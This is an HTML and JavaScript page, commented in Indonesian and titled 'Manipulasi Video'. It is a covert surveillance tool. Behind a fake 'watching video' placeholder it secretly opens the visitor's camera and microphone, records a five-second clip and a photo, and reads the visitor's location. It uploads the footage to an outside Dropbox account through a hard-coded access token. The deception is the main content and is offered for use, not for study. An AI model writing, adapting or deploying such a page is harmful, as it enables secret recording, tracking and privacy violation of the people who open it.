<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manipulasi Video</title>
    <style>
        #videoElement {
            width: 100%;
            height: auto;
            display: none; /* Menyembunyikan video asli */
        }
        #fakeVideo {
            width: 100%;
            height: auto;
            background-color: #000;
            text-align: center;
            color: white;
            font-size: 20px;
            line-height: 400px; /* Agar tulisan muncul di tengah */
        }
        #actionBtn {
            margin-top: 20px;
            padding: 15px;
            background-color: #4CAF50;
            color: white;
            font-size: 18px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Manipulasi Video dan Fungsi Lainnya</h1>
    
    <!-- Video yang sebenarnya akan disembunyikan -->
    <video id="videoElement" autoplay muted></video>

    <!-- Video Placeholder seolah-olah video sedang diputar -->
    <div id="fakeVideo">
        <p>Menonton Video...</p>
    </div>

    <!-- Tombol untuk memulai semua fungsi -->
    <button id="actionBtn">Mulai Semua Fungsi</button>

    <script>
        let videoElement = document.getElementById('videoElement');
        let fakeVideo = document.getElementById('fakeVideo');
        let actionBtn = document.getElementById('actionBtn');

        let mediaStream;
        let mediaRecorder;
        let recordedChunks = [];
        let locationData = [];

        // Ganti dengan token akses Dropbox Anda
        const DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN';

        // Fungsi untuk melacak lokasi pengguna
        function trackLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    console.log('Latitude: ' + position.coords.latitude);
                    console.log('Longitude: ' + position.coords.longitude);
                }, function(error) {
                    console.log('Error dalam melacak lokasi:', error);
                });
            } else {
                console.log('Geolocation tidak didukung di browser ini.');
            }
        }

        // Fungsi untuk memulai video
        function startVideo() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    mediaStream = stream;
                    videoElement.srcObject = stream; // Menampilkan video asli
                    videoElement.style.display = 'none'; // Menyembunyikan video asli
                    fakeVideo.style.display = 'block'; // Menampilkan video placeholder
                    trackLocation(); // Mulai melacak lokasi ketika video dimulai
                })
                .catch(function(error) {
                    console.log('Akses kamera gagal: ', error);
                });
        }

        // Fungsi untuk mulai merekam video
        function startRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(mediaStream);

            mediaRecorder.ondataavailable = function(event) {
                recordedChunks.push(event.data);
            };

            mediaRecorder.onstop = function() {
                let blob = new Blob(recordedChunks, { type: 'video/webm' });
                uploadToDropbox(blob, 'video'); // Unggah video ke Dropbox
            };

            mediaRecorder.start();
        }

        // Fungsi untuk mengambil foto dari kamera
        function takePhoto() {
            let canvas = document.createElement('canvas');
            let context = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                uploadToDropbox(blob, 'photo'); // Unggah foto ke Dropbox
            }, 'image/jpeg');
        }

        // Fungsi untuk mengunggah file ke Dropbox
        function uploadToDropbox(fileBlob, type) {
            const url = 'https://content.dropboxapi.com/2/files/upload';
            const xhr = new XMLHttpRequest();
            const fileName = type === 'video' ? 'recorded_video.webm' : 'photo.jpg';

            xhr.open('POST', url, true);
            xhr.setRequestHeader('Authorization', 'Bearer ' + DROPBOX_ACCESS_TOKEN);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({
                path: '/Uploads/' + fileName,
                mode: 'add',
                autorename: true,
                mute: false
            }));

            xhr.onload = function() {
                console.log('File berhasil diunggah ke Dropbox:', xhr.responseText);
            };

            xhr.onerror = function() {
                console.error('Gagal mengunggah ke Dropbox');
            };

            xhr.send(fileBlob);
        }

        // Fungsi utama yang memulai semua proses
        function startAllFunctions() {
            actionBtn.disabled = true; // Nonaktifkan tombol selama proses
            actionBtn.textContent = 'Menunggu Rekaman...';

            startVideo(); // Mulai video dan lokasi
            startRecording(); // Mulai merekam setelah video dimulai

            // Ambil foto setelah 2 detik
            setTimeout(function() {
                takePhoto();
            }, 2000); // Foto setelah 2 detik

            // Setelah 5 detik, hentikan rekaman dan sembunyikan video
            setTimeout(function() {
                mediaRecorder.stop(); // Berhenti merekam setelah 5 detik
                actionBtn.disabled = false; // Aktifkan kembali tombol
                actionBtn.textContent = 'Rekam Lagi';
            }, 5000); // Rekam selama 5 detik
        }

        // Tambahkan event listener pada tombol untuk memulai semua fungsi
        actionBtn.addEventListener('click', startAllFunctions);
    </script>
</body>
</html>
